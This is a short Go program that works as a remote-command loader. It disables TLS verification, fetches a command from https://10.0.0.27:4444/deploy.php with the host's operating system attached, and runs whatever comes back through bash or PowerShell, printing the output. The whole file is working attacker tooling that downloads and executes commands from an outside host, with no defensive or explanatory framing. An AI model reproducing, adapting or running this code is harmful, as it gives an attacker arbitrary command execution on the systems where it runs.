package main

import (
    "net/http"
    "os/exec"
    "bytes"
    "fmt"
    "crypto/tls"
    "runtime"
    //"strings"
)

func execute(cmd_str string){
    fmt.Println("Command: ", cmd_str)
    /*
    parts := strings.Fields(cmd_str)
    head := parts[0]
    parts = parts[1:len(parts)]

    fmt.Println("Head, Parts: ", head, parts)
    args := ""
    if len(head) + 1 < len(cmd_str){
        args = cmd_str[len(head)+1:]
    }
    */
    shell := "bash"
    if runtime.GOOS == "windows"{
        shell = "powershell"
    }
    cmd := exec.Command(shell, "-c", cmd_str)
    
    out , _ := cmd.CombinedOutput()
    fmt.Println(string(out))
}

func main() {
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

    url := "https://10.0.0.27:4444/deploy.php?platform="+runtime.GOOS+"&variant=go"
    resp, _ := http.Get(url)
    defer resp.Body.Close()
    buf := new(bytes.Buffer)
    buf.ReadFrom(resp.Body)
    cmd_str := buf.String()
    if resp.StatusCode == http.StatusOK {
        execute(cmd_str)
    } else {
        fmt.Printf("Status: %d\n", resp.StatusCode)
    }
}
